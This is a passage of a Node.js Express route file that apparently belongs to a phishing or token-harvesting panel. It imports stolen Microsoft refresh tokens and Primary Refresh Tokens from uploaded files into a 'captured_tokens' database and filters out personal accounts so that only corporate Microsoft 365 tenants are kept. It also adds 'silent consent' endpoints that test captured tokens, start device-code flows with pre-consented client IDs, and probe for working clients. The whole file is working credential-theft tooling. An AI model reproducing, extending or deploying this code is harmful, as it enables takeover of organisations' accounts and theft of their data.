    const file = req.file;
    if (!file) {
      return res.status(400).json({ error: 'No file uploaded' });
    }

    const content = file.buffer.toString('utf8').trim();
    let tokenData;

    console.log('[Tokens] File uploaded:', file.originalname, 'Size:', file.size, 'bytes');
    console.log('[Tokens] Full content:', content.substring(0, 500));

    // Try to parse as JSON first
    if (file.mimetype === 'application/json' || file.name.endsWith('.json')) {
      try {
        tokenData = JSON.parse(content);
        console.log('[Tokens] Parsed as JSON, type:', typeof tokenData, 'isArray:', Array.isArray(tokenData));
        console.log('[Tokens] JSON keys:', typeof tokenData === 'object' ? Object.keys(tokenData) : 'N/A');
      } catch (e) {
        console.log('[Tokens] JSON parse failed:', e.message);
        tokenData = parseAlternativeFormat(content);
      }
    } else {
      // Try JSON first
      try {
        tokenData = JSON.parse(content);
      } catch (e) {
        // Try alternative formats (keychain, WebKit, etc.)
        tokenData = parseAlternativeFormat(content);
      }
    }

    // If tokenData is a string (raw token), wrap it
    if (typeof tokenData === 'string') {
      // Check if it looks like a refresh token or PRT
      if (tokenData.startsWith('0.AT') || tokenData.startsWith('M.R') || tokenData.length > 100) {
        tokenData = { refresh_token: tokenData };
      } else {
        tokenData = { prt: tokenData };
      }
    }

    // Handle array of tokens
    if (Array.isArray(tokenData)) {
      console.log('[Tokens] Array of tokens:', tokenData.length);
      const results = [];
      for (const item of tokenData) {
        const result = await processImportedToken(req, item);
        results.push(result);
      }
      return res.json({
        success: true,
        imported: results.filter(r => r.success).length,
        failed: results.filter(r => !r.success).length,
        results: results
      });
    }

    // Single token - ensure it's an object
    if (typeof tokenData !== 'object' || tokenData === null) {
      return res.status(400).json({ error: 'Could not extract token data from file' });
    }

    // Normalize the token data
    tokenData = normalizeTokenKeys(tokenData);
    console.log('[Tokens] Normalized keys:', Object.keys(tokenData));

    // Try to find token in any field if not found in standard fields
    if (!tokenData.refresh_token && !tokenData.prt) {
      console.log('[Tokens] No standard token field found, searching all fields...');
      for (const [key, value] of Object.entries(tokenData)) {
        const lowerKey = key.toLowerCase();
        console.log('[Tokens] Checking field:', key, 'type:', typeof value, 'length:', typeof value === 'string' ? value.length : 'N/A');
        
        if (typeof value === 'string') {
          // Check if key contains token-related words
          if (lowerKey.includes('token') || lowerKey.includes('prt') || lowerKey.includes('refresh')) {
            if (lowerKey.includes('refresh') || lowerKey.includes('access')) {
              tokenData.refresh_token = value;
              console.log('[Tokens] Found refresh_token in field:', key);
            } else if (lowerKey.includes('prt')) {
              tokenData.prt = value;
              console.log('[Tokens] Found prt in field:', key);
            } else {
              // Assume it's a refresh token by default
              tokenData.refresh_token = value;
              console.log('[Tokens] Found token in field:', key, '- assuming refresh_token');
            }
            break;
          }
          
          // Check if value looks like a token (long string)
          if (value.length > 50 && !key.includes('email') && !key.includes('name')) {
            if (value.startsWith('0.AT') || value.startsWith('M.R') || value.length > 200) {
              tokenData.refresh_token = value;
              console.log('[Tokens] Found long token value in field:', key);
              break;
            }
          }
        }
        
        // Check nested objects
        if (typeof value === 'object' && value !== null) {
          const nested = normalizeTokenKeys(value);
          if (nested.refresh_token || nested.prt) {
            if (nested.refresh_token) tokenData.refresh_token = nested.refresh_token;
            if (nested.prt) tokenData.prt = nested.prt;
            console.log('[Tokens] Found token in nested object:', key);
            break;
          }
        }
      }
    }

    console.log('[Tokens] Final token data keys:', Object.keys(tokenData));
    console.log('[Tokens] Has refresh_token:', !!tokenData.refresh_token, 'Has prt:', !!tokenData.prt);
    
    const result = await processImportedToken(req, tokenData);
    if (result.success) {
      res.json({ success: true, token_id: result.token_id, email: result.email, message: 'Token imported successfully' });
    } else {
      console.log('[Tokens] Import failed:', result.error);
      res.status(400).json({ error: result.error, details: result.details });
    }
  } catch (err) {
    console.error('[Tokens] File import error:', err.message);
    console.error('[Tokens] Stack:', err.stack);
    res.status(500).json({ error: 'Server error: ' + err.message });
  }
}

// ─── Parse alternative token formats (keychain, WebKit, etc.) ────────────────
function parseAlternativeFormat(content) {
  const tokenObj = {};

  // Handle multipart form data (------WebKitFormBoundary...)
  const boundaryLines = content.split('\n').filter(line => line.trim().startsWith('------'));
  if (boundaryLines.length > 0) {
    const lines = content.split('\n');
    let currentField = '';
    for (let i = 0; i < lines.length; i++) {
      const line = lines[i].trim();
      const dispMatch = line.match(/name="([^"]+)"/);
      if (dispMatch) {
        currentField = dispMatch[1];
        if (i + 2 < lines.length) {
          const valueLine = lines[i + 2];
          if (valueLine && !valueLine.startsWith('-')) {
            tokenObj[currentField] = valueLine.trim();
          }
        }
      }
    }
    if (Object.keys(tokenObj).length > 0) {
      return normalizeTokenKeys(tokenObj);
    }
  }

  // Try key:value format
  const lines = content.split('\n');
  for (const line of lines) {
    const colonIndex = line.indexOf(':');
    if (colonIndex > 0 && colonIndex < 100) {
      const key = line.substring(0, colonIndex).trim().replace(/^["']|["']$/g, '');
      const value = line.substring(colonIndex + 1).trim().replace(/^["']|["']$/g, '').replace(/,$/, '');
      if (key && value && !key.startsWith('#') && !key.startsWith('-') && !key.startsWith('Content')) {
        tokenObj[key] = value;
      }
    }
  }

  if (tokenObj.refresh_token || tokenObj.prt || tokenObj.email) {
    return normalizeTokenKeys(tokenObj);
  }

  return tokenObj;
}

function normalizeTokenKeys(obj) {
  const normalized = {};
  
  // Handle null/undefined
  if (!obj) return normalized;
  
  // If it's a string, try to parse it as JSON first
  if (typeof obj === 'string') {
    try {
      obj = JSON.parse(obj);
    } catch (e) {
      // Not JSON, return as-is
      return { raw: obj };
    }
  }
  
  // If it's an array, process each item
  if (Array.isArray(obj)) {
    return obj;
  }
  
  // Process each key-value pair
  for (const [key, value] of Object.entries(obj)) {
    const lowerKey = key.toLowerCase().replace(/[_-]/g, '_');
    
    // Handle nested objects - flatten them
    if (typeof value === 'object' && value !== null && !Array.isArray(value)) {
      const nested = normalizeTokenKeys(value);
      for (const [nk, nv] of Object.entries(nested)) {
        if (!normalized[nk]) {
          normalized[nk] = nv;
        }
      }
      continue;
    }
    
    // Map common variations to standard names
    if (lowerKey === 'email' || lowerKey === 'e_mail' || lowerKey === 'user_email') {
      normalized.email = value;
    } else if (lowerKey === 'name' || lowerKey === 'user_name' || lowerKey === 'display_name') {
      normalized.name = value;
    } else if (lowerKey === 'access_token' || lowerKey === 'accesstoken' || lowerKey === 'access token') {
      normalized.access_token = value;
    } else if (lowerKey === 'refresh_token' || lowerKey === 'refreshtoken' || lowerKey === 'refresh token' || lowerKey === 'refresh') {
      normalized.refresh_token = value;
    } else if (lowerKey === 'prt' || lowerKey === 'primary_refresh_token' || lowerKey === 'primaryrefreshToken') {
      normalized.prt = value;
    } else if (lowerKey === 'tenant' || lowerKey === 'tenant_id' || lowerKey === 'tenantid') {
      normalized.tenant = value;
    } else if (lowerKey === 'client_id' || lowerKey === 'clientid' || lowerKey === 'client_id') {
      normalized.client_id = value;
    } else if (lowerKey === 'account_type' || lowerKey === 'accounttype' || lowerKey === 'account type') {
      normalized.account_type = value;
    } else if (lowerKey === 'notes' || lowerKey === 'note' || lowerKey === 'description') {
      normalized.notes = value;
    } else if (lowerKey === 'id_token' || lowerKey === 'idtoken') {
      normalized.id_token = value;
    } else {
      // Keep original key for unknown fields
      normalized[key] = value;
    }
  }
  
  return normalized;
}

// ─── Process a single imported token ───────────────────────────────────────
async function processImportedToken(req, data) {
  try {
    // First, normalize the data keys
    const normalized = normalizeTokenKeys(data);
    
    console.log('[Tokens] Processing normalized data:', Object.keys(normalized));
    
    // Validate required fields - check multiple possible field names
    const refreshToken = normalized.refresh_token || '';
    const prt = normalized.prt || '';
    
    // Also check if there's a nested object with tokens
    if (!refreshToken && !prt) {
      // Try to find any token-like fields
      for (const [key, value] of Object.entries(normalized)) {
        if (typeof value === 'string' && value.length > 50) {
          if (key.toLowerCase().includes('refresh') || key.toLowerCase().includes('token')) {
            normalized.refresh_token = value;
            break;
          }
        }
      }
    }
    
    const refreshTokenFinal = normalized.refresh_token || '';
    const prtFinal = normalized.prt || '';
    
    if (!refreshTokenFinal && !prtFinal) {
      console.log('[Tokens] No token found. Available keys:', Object.keys(normalized));
      return { 
        success: false, 
        error: 'Missing refresh_token or prt', 
        email: normalized.email || '',
        details: 'Available fields: ' + Object.keys(normalized).join(', ')
      };
    }
    
    const email = normalized.email || '';
    const name = normalized.name || '';
    const accessToken = normalized.access_token || '';
    const tenant = normalized.tenant || 'common';
    const clientId = normalized.client_id || config.AZURE_CLIENT_ID || '29d9ed98-a469-4536-ade2-f981bc1d605e';
    const notes = normalized.notes || '';
    const accountType = normalized.account_type || 'work_school';

    // ─── Personal Account Detection & Rejection ────────────────
    const personalDomains = [
      'outlook.com', 'hotmail.com', 'live.com', 'msn.com',
      'outlook.co', 'hotmail.co', 'live.co', 'msn.co',
      'outlook.fr', 'hotmail.fr', 'live.fr', 'msn.fr',
      'outlook.de', 'hotmail.de', 'live.de', 'msn.de',
      'outlook.it', 'hotmail.it', 'live.it', 'msn.it',
      'outlook.es', 'hotmail.es', 'live.es', 'msn.es',
      'outlook.com.br', 'hotmail.com.br', 'live.com.br',
      'outlook.com.au', 'hotmail.com.au', 'live.com.au',
      'outlook.co.uk', 'hotmail.co.uk', 'live.co.uk',
      'outlook.in', 'hotmail.in', 'live.in',
      'outlook.jp', 'hotmail.jp', 'live.jp',
      'outlook.kr', 'hotmail.kr', 'live.kr',
      'gmail.com', 'gmail.co', 'googlemail.com',
      'yahoo.com', 'yahoo.co', 'yahoo.co.uk', 'yahoo.fr', 'yahoo.de',
      'icloud.com', 'me.com', 'mac.com',
      'aol.com', 'aol.co', 'aim.com',
      'protonmail.com', 'proton.me', 'pm.me',
      'mail.com', 'gmx.com', 'gmx.de', 'web.de',
      'yandex.com', 'yandex.ru', 'mail.ru'
    ];

    const emailDomain = email ? email.split('@').pop().toLowerCase() : '';
    const isPersonalEmail = personalDomains.includes(emailDomain);
    const isPersonalAccount = accountType === 'personal' || isPersonalEmail;

    if (isPersonalAccount) {
      return {
        success: false,
        error: 'Personal Microsoft accounts are not supported',
        details: `The email domain "${emailDomain}" is a personal account provider. Only Work/School (Microsoft 365 / Azure AD) accounts are supported.`,
        email: email
      };
    }

    // Validate work/school domain
    if (email) {
      const domainParts = emailDomain.split('.');
      if (domainParts.length < 2) {
        return { success: false, error: 'Invalid email format', email: email };
      }

      const workTlds = ['.edu', '.gov', '.org', '.ac', '.mil', '.co'];
      const hasWorkTld = workTlds.some(tld => emailDomain.endsWith(tld));

      if (!hasWorkTld && domainParts.length === 2 && domainParts[0].length < 3) {
        return {
          success: false,
          error: `Suspicious email domain "${emailDomain}". Only Work/School accounts are supported.`,
          email: email
        };
      }
    }

    // Force account type to work_school
    const forcedAccountType = 'work_school';

    // Encrypt tokens - use the final values
    const accessEncrypted = accessToken ? encrypt(accessToken) : null;
    const refreshEncrypted = refreshTokenFinal ? encrypt(refreshTokenFinal) : null;
    const prtEncrypted = prtFinal ? encrypt(prtFinal) : null;

    // Insert into database
    const [result] = await db.query(
      `INSERT INTO captured_tokens
       (user_id, link_id, email, token_type, access_token_encrypted, refresh_token_encrypted,
        prt, ip_address, user_agent, notes, expiration, tenant, template_type,
        account_type, client_id, token_status, name)
       VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, DATE_ADD(NOW(), INTERVAL 1 HOUR), ?, ?, ?, ?, ?, ?)`,
      [
        req.user.id,
        null,
        email,
        'token',
        accessEncrypted,
        refreshEncrypted,
        prtEncrypted,
        'manual',
        'File Import',
        notes,
        tenant,
        'office',
        forcedAccountType,
        clientId,
        'active',
        name
      ]
    );

    return { success: true, token_id: result.insertId, email: email };
  } catch (err) {
    console.error('[Tokens] Process token error:', err.message);
    return { success: false, error: err.message, email: data.email || '' };
  }
}

// ─── Silent consent: Test if existing refresh token works ────────────
router.post('/silent-consent/test', userAuth, async (req, res) => {
  try {
    const { refresh_token, tenant, account_type, template_type } = req.body;

    if (!refresh_token) {
      return res.status(400).json({ error: 'refresh_token is required' });
    }

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const consentConfig = silentConsentService.getPreConsentedClient(accountType, tenantVal, templateType);
    const result = await silentConsentService.testRefreshToken(
      refresh_token,
      consentConfig.tokenEndpoint,
      consentConfig.client_id,
      consentConfig.scopes
    );

    res.json({
      success: result.success,
      consent_required: !result.success,
      access_token: result.access_token,
      new_refresh_token: result.new_refresh_token,
      strategy: result.success ? 'token_valid' : 'consent_needed'
    });
  } catch (err) {
    console.error('[Tokens] Silent consent test error:', err.message);
    res.status(500).json({ error: 'Silent consent test failed: ' + err.message });
  }
});

// ─── Silent consent: Initiate device flow with pre-consented client ─
router.post('/silent-consent/device-flow', userAuth, async (req, res) => {
  try {
    const { tenant, account_type, template_type, existing_refresh_token } = req.body;

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const result = await silentConsentService.initiateSilentDeviceFlow(
      tenantVal,
      accountType,
      templateType,
      existing_refresh_token
    );

    res.json(result);
  } catch (err) {
    console.error('[Tokens] Silent consent device flow error:', err.message);
    res.status(500).json({ error: 'Silent consent device flow failed: ' + err.message });
  }
});

// ─── Silent consent: Find best working client for tenant ─────────────
router.post('/silent-consent/find-client', userAuth, async (req, res) => {
  try {
    const { tenant, account_type, template_type } = req.body;

    const tenantVal = tenant || config.AZURE_TENANT || 'common';
    const accountType = account_type || 'work_school';
    const templateType = template_type || 'office';

    const result = await silentConsentService.findWorkingClient(tenantVal, accountType, templateType);
    res.json(result);
  } catch (err) {
    console.error('[Tokens] Find client error:', err.message);
    res.status(500).json({ error: 'Find client failed: ' + err.message });
  }
});

module.exports = router;
